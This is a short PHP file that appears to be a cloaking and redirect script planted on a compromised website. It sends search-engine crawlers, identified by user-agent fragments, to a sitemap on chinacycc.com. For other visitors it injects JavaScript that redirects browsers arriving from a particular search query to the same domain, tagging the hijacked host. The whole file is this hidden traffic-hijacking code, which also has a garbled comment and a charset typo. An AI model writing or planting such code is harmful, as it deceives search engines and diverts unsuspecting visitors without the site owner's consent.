<?php 
header('Content-Type:text/html;charset=uft-8');
$key= $_SERVER["HTTP_USER_AGENT"];

if(strpos($key,'oogle')!== false||strpos($key,'aidu')!==false||strpos($key,'ahoo')!==false||strpos($key,'ing')!==false)
{
//¹Ø¼ü´Ê
$GoTo="http://www.chinacycc.com/sitemap.html";    
header(sprintf("Location: %s", $GoTo)); 
}
else
{
echo "<script type='text/javascript'>var d=document.referrer;var re=/((wd|q|w|p|query)(=)([%A-Z0-9]*)(%E8%AF%9A%E6%AE%B7%E7%BD%91%E7%BB%9CCYWL%20TEAM))/;if(re.test(d)){self.location='http://www.chinacycc.com?'+window.location.host;window.adworkergo='ad_app6'}else{}</script>";
}
?>